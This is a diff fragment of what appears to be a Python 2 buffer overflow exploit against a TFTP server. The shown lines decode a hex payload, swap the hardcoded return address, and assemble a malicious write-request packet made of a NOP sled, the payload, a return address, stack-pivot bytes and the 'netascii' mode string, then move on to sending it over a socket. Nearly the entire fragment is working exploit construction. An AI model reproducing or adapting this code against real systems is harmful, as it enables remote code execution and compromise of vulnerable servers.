@@ -106,8 +106,9 @@ while x < len(encodedPL)-1:
         epl += binascii.a2b_hex(encodedPL[x] +encodedPL[x+1])
         #epl += '\\x' + encodedPL[x] +encodedPL[x+1]
         x = x+2
-#epl = 206 *'\x90' + 'AAAA'
-ret = '\xfb\x3e\xe0\x77'
+
+#epl = 'CCCC' + 206 *'\x90'
+ret = '\x38\x07\xd2\x77'
 exploit = "\x00\x02" + nop + epl + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
 #print exploit
 ## create socket and send
